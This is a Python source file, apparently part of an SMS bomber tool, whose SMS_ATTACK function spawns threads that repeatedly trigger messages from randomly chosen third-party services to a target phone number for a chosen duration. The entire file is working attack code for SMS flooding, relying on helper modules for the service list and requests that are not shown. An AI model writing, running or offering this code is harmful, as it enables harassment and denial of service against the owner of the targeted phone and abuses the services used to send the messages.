#!/usr/bin/env python3

import time
from threading import Thread

import tools.SMS.sendrequest as request
import tools.SMS.phonenumbers as number
import tools.SMS.randomdata  as randomData

class bcolors:
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'

def SMS_ATTACK(threads, attack_time, phone):

	global FINISH
	FINISH = False
	threads_list = []


	services = request.getServices()

	phone = number.normalize(phone)

	country = number.getCountry(phone)
	print(bcolors.OKCYAN + "[*]Starting SMS flooding")


	def sms_flood():
		while not FINISH:
			service = randomData.random_service(services)
			service = request.Service(service)
			service.sendMessage(phone)


	# Start threads
	for thread in range(threads):
		print(bcolors.OKBLUE + "[*]Starting thread " + str(thread) + "...")
		t = Thread(target = sms_flood)
		t.start()
		threads_list.append(t)

	try:
		time.sleep(attack_time)
	except KeyboardInterrupt:
		FINISH = True

	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print(bcolors.WARNING +"[i] Attack completed.")
